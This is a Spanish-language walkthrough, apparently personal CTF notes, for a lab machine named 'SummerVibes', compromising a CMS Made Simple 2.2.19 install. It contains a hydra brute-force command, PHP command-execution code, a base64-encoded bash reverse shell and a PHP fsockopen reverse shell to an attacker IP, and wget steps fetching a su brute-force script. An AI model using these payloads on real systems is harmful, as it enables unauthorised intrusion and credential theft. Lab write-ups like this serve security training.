# SummerVibes

Tags: [[_cms]],[[_webFuzzing]],[[_bruteForce]],[[_permissionAbuse]]

Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.
Le hacemos un ping a la máquina.
Posible máquina Linux.

Empezamos el escaneo con NMAP.

Puertos abiertos:
22 - Superior a la 7.7
80 - Página por defecto de Apache.

Posible codename: Ubuntu Jammy.

Veamos la web en busca de Information Leakege.
Empecemos a fuzzear directorios.

No vemos nada interesante.
Podría hacer un escaneo para puertos filtrados, o de otros protocolos.

En el código fuente de la página de apache por defecto, está la imagen de apache, podemos pensar en que se está aplicando esteganografía.

Dicha imagen se encuentra en la ruta icons, podríamos fuzzear ahí.

Hasta abajo en el código fuente hay un comentario, dice que tengo que usar "cmsms" para entrar al CMS.
Y sí, me lleva a una página.
Versión de jQuery desactualizada.

Se ve que es un CMS MADE SIMPLE.
Es un gestor de contenidos. Versión 2.2.19
Buscando en Internet, parece que es vulnerable a un SSTI.

Parece que debo estar como admin. El cual existe, porque posteó una noticia.

Para ir encontrando información, debería hacer fuzzing pero sobre el nuevo directorio.
COSITAS.

Direcory Listing en un directorio. Como tal, no tienen nada.

Como tal, el único interesante es el de admin, para loguearme, el cual ya había visto de antes.

Así que hay que entrar como admin sí o sí.
Por fuerza bruta.

---
De momento no ha funcionado.

Con hydra.
Especificando todos los parámteros.
<span style="color:#88c425">hydra -l admin -P rockyou.txt 172.17.0.2 http-post-form '/cmsms/admin/login.php:username=^USER^&password=^PASS^&Login=Login:User name or password incorrect'
</span>
^PASS^ :    donde se va a sustituir la contraseña.
^USER^ :    donde es el que especificamos.
Nota. Hay que interceptar con BurpSuite para ver cómo viaja la información.

---

Lo mejor es hacerlo en python, hay que hacerlo.

https://cosasdedevs.com/posts/usar-requests-python-api-rest/

La contraseña es "chocolate", del usuario "admin".

En un principio, habiendo ganado acceso, me dirigí a:
Extensions > User Defined Tags
Agregué un nuevo Tag, metí esto en el code:
< ?php echo system('id'); ?>
Me lo interpretó y vi el Output.

Ganemos acceso a la máquina.
No tiene curl, así que hagámoslo de forma tradicional.

< ?php echo system('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuNi80NDMgMD4mMQo=" | base64 -d | bash'); ?>

Ocupé este Payload, donde el base64 es una reverse sehll con bash.

Otro base64:
php -r '\$sock=fsockopen(\\"192.168.│
0.6\\",443);exec(\\"/bin/bash -i <&3 >&3 2>&3\\");'

Se pone en base64, y se usa como el de arriba, este es de php. (Se escapan solo las comillas y el "$" dólar).


ESCALADA DE PRIVILEGIOS.
Toca ponerse a investigar.
Efectivamente, es un Ubuntu Jammy.
crontab -l :    para ver si lo tiene instalado, he ir pensando si pueden haber tareas cron.

Emmm, puse su
puse "chocolate" como contraseña, y soy root.


Con este explopit se puede hacer fuerza bruta para saber la contraseña de un usuario.
https://github.com/Maalfer/Sudo_BruteForce

Lo descargamos en la máquina víctima con wget 
Y descargamos el rockyou.txt, desde la máquina atacante:
Desde donde está el rockyou.txt
<span style="color:#88c425">python3 -m http.server 80</span>

Y en la máquina víctima:
<span style="color:#88c425">wget 192.168.0.6/rockyou.txt</span>

Para poder hacer en la máquina víctima:
<span style="color:#88c425">bash Linux-Su-Force.sh root rockyou.txt</span>

FINALIZADA.

